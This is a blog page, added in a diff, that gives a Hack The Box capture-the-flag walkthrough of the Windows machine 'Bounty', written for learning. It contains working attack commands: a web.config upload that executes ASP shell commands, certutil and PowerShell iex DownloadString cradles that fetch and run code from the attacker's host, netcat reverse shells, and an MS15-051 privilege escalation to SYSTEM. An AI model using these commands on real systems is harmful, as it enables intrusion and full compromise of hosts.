@@ -1,0 +1,528 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          Hack The Box - Bounty - DiegoExploit
+        
+    </title>
+    <style>
+  #carbonads {
+    border: 1px solid black;
+    border-radius: 7px;
+    border-spacing: 7px;
+    display: block;
+    overflow: hidden;
+    padding: 1em;
+    line-height: 1.5;
+  }
+  #carbonads span {
+    position: relative;
+    display: block;
+    overflow: hidden;
+  }
+  .carbon-img {
+    float: left;
+    margin-right: 1em;
+  }
+  .carbon-img img {
+    display: block;
+  }
+  .carbon-text {
+    display: block;
+    float: left;
+    max-width: calc(100% - 130px - 1em);
+    text-align: left;
+  }
+  .carbon-poweredby {
+    position: absolute;
+    left: 142px;
+    bottom: 0;
+    display: block;
+    font-size: .8em;
+    line-height: 1;
+    letter-spacing: 1px;
+    }
+    </style>
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+<!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-P385GSF');</script>
+<!-- End Google Tag Manager -->
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-P385GSF"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+    <style>
+      #htbbadge{
+        float: left;
+      }
+    </style>
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="DiegoExploit" type="application/rss+xml">
+</head>
+
+<body>
+
+<div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>DiegoExploit</span>
+  </a>
+</div>
+    <div class="book-menu">
+  <ul>
+<li><a href="/">Home</a></li>
+</ul>
+<h1 id="Categories Windows"><a href="#Categories Windows" class="headerlink" title="Categories Windows"></a>Categories Windows</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+
+<li><a href="/hack-the-box/legacy/">1. Hack The Box - Legacy</a></li>
+<li><a href="/hack-the-box/devel/">2. Hack The Box - Devel</a></li>
+<li><a href="/hack-the-box/optimum/">3. Hack The Box - Optimum</a></li>
+<li><a href="/hack-the-box/bastard/">4. Hack The Box - Bastard</a></li>
+<li><a href="/hack-the-box/artic/">5. Hack The Box - Artic</a></li>
+<li><a href="/hack-the-box/grandpa/">6. Hack The Box - Grandpa</a></li>
+<li><a href="/hack-the-box/granny/">7. Hack The Box - Granny</a></li>
+<li><a href="/hack-the-box/blue/">8. Hack The Box - Blue</a></li>
+<li><a href="/hack-the-box/silo/">9. Hack The Box - Silo</a></li>
+<li><a href="/hack-the-box/bounty/">10. Hack The Box - Bounty</a></li>
+<li><a href="/hack-the-box/jerry/">11. Hack The Box - Jerry</a></li>
+<li><a href="/hack-the-box/conceal/">12. Hack The Box - Conceal</a></li>
+<li><a href="/hack-the-box/chatterbox/">13. Hack The Box - Chatterbox</a></li>
+<li><a href="/hack-the-box/forest/">14. Hack The Box - Forest</a></li>
+<li><a href="/hack-the-box/bankrobber/">15. Hack The Box - BkRobber</a></li>
+<li><a href="/hack-the-box/secnotes/">16. Hack The Box - Secnotes</a></li>
+<li><a href="/hack-the-box/bastion/">17. Hack The Box - Bastion</a></li>
+
+
+</ul>
+<h1 id="Categories Linux"><a href="#Categories Linux" class="headerlink" title="Categories Linux"></a>Categories Linux</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+<li><a href="/hack-the-box/lame/">1. Hack The Box - Lame</a></li>
+<li><a href="/hack-the-box/popcorn/">2. Hack The Box - Popcorn</a></li>
+<li><a href="/hack-the-box/beep/">3. Hack The Box - Beep</a></li>
+<li><a href="/hack-the-box/tenten/">4. Hack The Box - Tenten</a></li>
+<li><a href="/hack-the-box/cronos/">5. Hack The Box - Cronos</a></li>
+<li><a href="/hack-the-box/brainfuck/">6. Hack The Box - brainfuck</a></li>
+<li><a href="/hack-the-box/shocker/">6. Hack The Box - Shocker</a></li>
+<li><a href="/hack-the-box/bashed/">7. Hack The Box - Bashed</a></li>
+<li><a href="/hack-the-box/nibbles/">8. Hack The Box - Nibbles</a></li>
+<li><a href="/hack-the-box/nineveh/">9. Hack The Box - Nineveh</a></li>
+<li><a href="/hack-the-box/sense/">10. Hack The Box - Sense</a></li>
+<li><a href="/hack-the-box/solidstate/">11. Hack The Box - SolidState</a></li>
+<li><a href="/hack-the-box/kotarak/">12. Hack The Box - Kotarak</a></li>
+<li><a href="/hack-the-box/node/">13. Hack The Box - Node</a></li>
+<li><a href="/hack-the-box/valentine/">14. Hack The Box - Valentine</a></li>
+<li><a href="/hack-the-box/poison/">15. Hack The Box - Poison</a></li>
+<li><a href="/hack-the-box/sunday/">16. Hack The Box - Sunday</a></li>
+<li><a href="/hack-the-box/tartasauce/">17. Hack The Box - Tartasauce</a></li>
+<li><a href="/hack-the-box/friendzone/">18. Hack The Box - Friendzone</a></li>
+<li><a href="/hack-the-box/swagshop/">19. HTB- SwagShop</a></li>
+<li><a href="/hack-the-box/jarvis/">20. Hack The Box Jarvis</a></li>
+</ul>
+
+
+
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  <br>
+  <h1 id="Hack-The-Box-Bounty"><a href="#Hack-The-Box-Bounty" class="headerlink" title="Hack The Box - Bounty"></a>Hack The Box - Bounty</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Bounty is an easy to medium difficulty machine, which features an interesting technique to bypass file uploader protections and achieve code execution. This machine also highlights the importance of keeping systems updated with the latest security patches. Its IP address is <code>10.10.10.93</code> Let’s go to hack!!!<br><img src="/images/hackthebox/exploit/Bounty/0.png" alt=""></p>
+<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2>
+<p>As always we will start with <code>nmap</code> to scan for open ports and services:
+
+<pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/bounty)
+ |
+ |-->{SFire129}#nmap -sC -sV 10.10.10.93
+ Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-06 17:37 EDT
+ Nmap scan report for 10.10.10.93
+ Host is up (0.10s latency).
+ Not shown: 999 filtered ports
+ PORT   STATE SERVICE VERSION
+ 80/tcp open  http    Microsoft IIS httpd 7.5
+ | http-methods:
+ |_  Potentially risky methods: TRACE
+ |_http-server-header: Microsoft-IIS/7.5
+ |_http-title: Bounty
+ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+ 
+ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+ Nmap done: 1 IP address (1 host up) scanned in 21.15 seconds<br></figure></pre>
+ <p>The output show the http service on port 80 and 443. 
+ <img src="/images/hackthebox/exploit/Bounty/1.png" alt=""></p>
+ <h2 id="Enumerate"><a href="#Enumerate" class="Enumerate" title="Enumerate"></a>Enumerate</h2>
+ <p>Launch the Gobuster for find directories and files.
+  <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/bounty)
+ |
+ |-->{SFire129}# gobuster dir --url http://10.10.10.93/ -w /usr/share/wordlists/dirbust
+ er/directory-list-lowercase-2.3-medium.txt -k -x .txt,.asp,.aspx
+ ===============================================================
+ Gobuster v3.0.1
+ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+ ===============================================================
+ [+] Url:            http://10.10.10.93/
+ [+] Threads:        10
+ [+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+ [+] Status codes:   200,204,301,302,307,401,403
+ [+] User Agent:     gobuster/3.0.1
+ [+] Extensions:     txt,asp,aspx
+ [+] Timeout:        10s
+ ===============================================================
+ 2020/06/06 18:41:57 Starting gobuster
+ ===============================================================
+ /transfer.aspx (Status: 200)
+ /uploadedfiles (Status: 301)
+ ===============================================================
+ 2020/06/06 21:07:12 Finished
+ ===============================================================<br></figure></pre>
+ <p>In the web browser look the directories, transfer.aspx is a file uploader.
+ <img src="/images/hackthebox/exploit/Bounty/2.png" alt=""></p>
+ <p>Upload a file with txt extension and capture data with Burpsuite, the output show an invalid file.
+ <img src="/images/hackthebox/exploit/Bounty/3.png" alt=""></p>
+ <p>Change the extension for aspx and capture again.
+ <img src="/images/hackthebox/exploit/Bounty/4.png" alt=""></p>
+ <p>Create a dictionary with extensions, in my case a file with name EXTENSION.
+ <img src="/images/hackthebox/exploit/Bounty/5.png" alt=""></p>
+ <p>Send to intruder section data and configure the payload with dictionary.
+ <img src="/images/hackthebox/exploit/Bounty/6.png" alt=""></p>
+ <p>Configure the payload into Burpsuite.
+ <img src="/images/hackthebox/exploit/Bounty/7.png" alt=""></p>
+ <p>Launch attack. The output show that files with extension .config are allowed.
+ <img src="/images/hackthebox/exploit/Bounty/8.png" alt=""></p>
+ <p>Create a file web.config, with the next code <a class="vglnk" href="https://github.com/diegoexploit/HackTheBox/blob/master/web.config" rel="nofollow"><span>web.config</span></a> 
+  <img src="/images/hackthebox/exploit/Bounty/16.png" alt=""></p>
+ <p>Upload the file, if the file has permissions will be show number 3.
+  <img src="/images/hackthebox/exploit/Bounty/9.png" alt=""></p>
+ <p>This section is for send commands.
+ <pre><figure class="highlight plain">%
+ Set rs = CreateObject("WScript.Shell")
+ Set cmd = rs.Exec("")
+ o = cmd.StdOut.Readall()
+ Response.write(o)
+ %></figure></pre>
+ <p>Upload again <code>web.config</code> file, capture the data with Burpsuite, and send commands, in this case, the command whoami.
+ <img src="/images/hackthebox/exploit/Bounty/10.png" alt=""></p>
+ <p>From http server in Kali Linux, download the <code>nc.exe</code> with the command <code>cmd /c certutil -urlcache -split -f http://10.10.14.27/agent.exe C:\\users\\public\\agent.exe</code>. NOTE: Each one to upload from repeater section, needs to do the request on web browser for complete the command.
+ <img src="/images/hackthebox/exploit/Bounty/12.png" alt=""></p>
+ <img src="/images/hackthebox/exploit/Bounty/13.png" alt=""></p>
+ <p>Send the command <code>cmd /c dir C:\users\public\ </code>for list directory and check the <code>nc.exe</code> was uploaded.
+ <h2 id="Exploit"><a href="#Exploit" class="Exploit" title="Exploit"></a>Exploit</h2>
+<p>Run the netcat listener and send reapeater data again with the execution command netcat for reverse conection.
+<img src="/images/hackthebox/exploit/Bounty/15.png" alt=""></p>
+<pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/bounty)
+ |
+ |-->{SFire129}#nc -nvlp 4445
+ listening on [any] 4445 ...
+ connect to [10.10.14.27] from (UNKNOWN) [10.10.10.93] 49161
+ Microsoft Windows [Version 6.1.7600]
+ Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+ 
+ c:\windows\system32\inetsrv>whoami
+ whoami
+ bounty\merlin
+ c:\Users\Public>systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+ systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+ OS Name:                   Microsoft Windows Server 2008 R2 Datacenter
+ OS Version:                6.1.7600 N/A Build 7600</figure></pre>
+<p>The OS looks like a vulnerable system, because not has patches/updates.
+<pre><figure class="highlight plain"> c:\Users\Public>wmic qfe
+ wmic qfe
+ No Instance(s) Available.
+ <br></figure></pre>
+<p>Download from Kali <code>sherlock.ps1</code> script for enumerate vulnerabilities on system target.
+ <pre><figure class="highlight plain"> c:\Users\Public>echo iex (New-Object Net.WebClient).DownloadString("http://10.10.14.27/Sherlock.ps1") | powershell -noprofile -
+ echo iex (New-Object Net.WebClient).DownloadString("http://10.10.14.27/Sherlock.ps1") | powershell -noprofile -
+ 
+ 
+ Title      : User Mode to Ring (KiTrap0D)
+ MSBulletin : MS10-015
+ CVEID      : 2010-0232
+ Link       : https://www.exploit-db.com/exploits/11199/
+ VulnStatus : Not supported on 64-bit systems
+ 
+ Title      : Task Scheduler .XML
+ MSBulletin : MS10-092
+ CVEID      : 2010-3338, 2010-3888
+ Link       : https://www.exploit-db.com/exploits/19930/
+ VulnStatus : Appears Vulnerable
+ 
+ Title      : NTUserMessageCall Win32k Kernel Pool Overflow
+ MSBulletin : MS13-053
+ CVEID      : 2013-1300
+ Link       : https://www.exploit-db.com/exploits/33213/
+ VulnStatus : Not supported on 64-bit systems
+ 
+ Title      : TrackPopupMenuEx Win32k NULL Page
+ MSBulletin : MS13-081
+ CVEID      : 2013-3881
+ Link       : https://www.exploit-db.com/exploits/31576/
+ VulnStatus : Not supported on 64-bit systems
+ 
+ Title      : TrackPopupMenu Win32k Null Pointer Dereference
+ MSBulletin : MS14-058
+ CVEID      : 2014-4113
+ Link       : https://www.exploit-db.com/exploits/35101/
+ VulnStatus : Not Vulnerable
+ 
+ Title      : ClientCopyImage Win32k
+ MSBulletin : MS15-051
+ CVEID      : 2015-1701, 2015-2433
+ Link       : https://www.exploit-db.com/exploits/37367/
+ VulnStatus : Appears Vulnerable
+ 
+ Title      : Font Driver Buffer Overflow
+ MSBulletin : MS15-078
+ CVEID      : 2015-2426, 2015-2433
+ Link       : https://www.exploit-db.com/exploits/38222/
+ VulnStatus : Not Vulnerable
+ 
+ Title      : 'mrxdav.sys' WebDAV
+ MSBulletin : MS16-016
+ CVEID      : 2016-0051
+ Link       : https://www.exploit-db.com/exploits/40085/
+ VulnStatus : Not supported on 64-bit systems
+ 
+ Title      : Secondary Logon Handle
+ MSBulletin : MS16-032
+ CVEID      : 2016-0099
+ Link       : https://www.exploit-db.com/exploits/39719/
+ VulnStatus : Not Supported on single-core systems
+ 
+ Title      : Windows Kernel-Mode Drivers EoP
+ MSBulletin : MS16-034
+ CVEID      : 2016-0093/94/95/96
+ Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS1
+              6-034?
+ VulnStatus : Not Vulnerable
+ 
+ Title      : Win32k Elevation of Privilege
+ MSBulletin : MS16-135
+ CVEID      : 2016-7255
+ Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/S
+              ample-Exploits/MS16-135
+ VulnStatus : Not Vulnerable
+ 
+ Title      : Nessus Agent 6.6.2 - 6.10.3
+ MSBulletin : N/A
+ CVEID      : 2017-7199
+ Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.h
+              tml
+ VulnStatus : Not Vulnerable<br></figure></pre>
+ <p>The system shown a vulnerability ms15-051,this  vulnerability is for scalate privileges.
+ <h2 id="Get-Privileges"><a href="#Get-Privileges" class="Get-Privileges" title="Get-Privileges"></a>Get Privileges</h2>
+ <p>With <a class="vglnk" href="https://github.com/diegoexploit/HackTheBox/blob/master/ms15-051.exe" rel="nofollow"><span>ms15-051.exe </span></a> , download in the system from Kali linux.
+ <pre><figure class="highlight plain"> c:\Users\Public>certutil -urlcache -split -f http://10.10.14.27/ms15-051.exe ms15-051.exe
+ certutil -urlcache -split -f http://10.10.14.27/ms15-051.exe ms15-051.exe
+ ****  Online  ****
+   0000  ...
+   d800
+ CertUtil: -URLCache command completed successfully<br></figure></pre>
+ <p>Run the program and get privileges.
+  <pre><figure class="highlight plain"> c:\Users\Public>ms15-051.exe whoami
+ ms15-051.exe whoami
+ [#] ms15-051 fixed by zcgonvh
+ [!] process with pid: 2776 created.
+ ==============================
+ nt authority\system<br></figure></pre>
+ <p>Run another netcat listener a send nc command for reverse shell with privileges root.
+ 
+ <pre><figure class="highlight plain"> c:\Users\Public>ms15-051.exe "nc.exe 10.10.14.27 4446 -e cmd"
+ ms15-051.exe "nc.exe 10.10.14.27 4446 -e cmd"
+ [#] ms15-051 fixed by zcgonvh
+ [!] process with pid: 1188 created.<br></figure></pre>
+ 
+  <pre><figure class="highlight plain">|-------(root@kali)-------|(~/HackTheBox/asp)
+ |
+ |-->{SFire129}#nc -nvlp 4446
+ listening on [any] 4446 ...
+ connect to [10.10.14.27] from (UNKNOWN) [10.10.10.93] 49158
+ Microsoft Windows [Version 6.1.7600]
+ Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+ c:\Users\Public>whoami
+ whoami
+ nt authority\system<br></figure></pre>
+
+ <h2 id="Capture-The-Flag"><a href="#Capture-The-Flag" class="Capture-The-Flag" title="Capture-The-Flag"></a>Capture The Flag</h2>
+
+<pre><figure class="highlight plain"> c:\Users>cd merlin
+ cd merlin
+ 
+ c:\Users\merlin>dir
+ dir
+  Volume in drive C has no label.
+  Volume Serial Number is 5084-30B0
+ 
+  Directory of c:\Users\merlin
+ 
+ 05/30/2018  12:22 AM    DIR          .
+ 05/30/2018  12:22 AM    DIR          ..
+ 05/30/2018  12:22 AM    DIR          Contacts
+ 05/31/2018  12:17 AM    DIR          Desktop
+ 05/30/2018  12:22 AM    DIR          Documents
+ 05/30/2018  12:22 AM    DIR          Downloads
+ 05/30/2018  12:22 AM    DIR          Favorites
+ 05/30/2018  12:22 AM    DIR          Links
+ 05/30/2018  12:22 AM    DIR          Music
+ 05/30/2018  12:22 AM    DIR          Pictures
+ 05/30/2018  12:22 AM    DIR          Saved Games
+ 05/30/2018  12:22 AM    DIR          Searches
+ 05/30/2018  12:22 AM    DIR          Videos
+                0 File(s)              0 bytes
+               13 Dir(s)  11,666,432,000 bytes free
+ 
+ c:\Users\merlin>cd Desktop
+ cd Desktop
+ c:\Users\merlin\Desktop>more user.txt
+ more user.txt
+ ***Here you could find the user  flag***
+ c:\Users\merlin\Desktop>type c:\Users\Administrator\Desktop\root.txt
+ type root.txt
+ ***Here you could find the root flag***
+ c:\Users\Administrator\Desktop>cd .
+ #</figure></pre>
+
+ 
+<p> And we owned root !</p>
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image -->
+    <div class="author-img">
+      
+        <figure class="avatar avatar-lg">
+          <img src="/avatar.png" alt="...">
+        </figure>
+      
+    </div>
+
+    <!-- Author title -->
+    <div class="author-title">
+      <div>DiegoExploit</div>
+      <div>2020-06-09</div>
+    </div>
+  </div>
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>
+
+      <a class="tag-link" href="/tags/linux/" rel="tag">#Windows</a> <a class="tag-link" href="/tags/sqli/" rel="tag">#Exploit</a> <a class="tag-link" href="/tags/ssh/" rel="tag">#aspx</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+</body>
+</html>
+
+
+<script src="/js/book.js"></script>
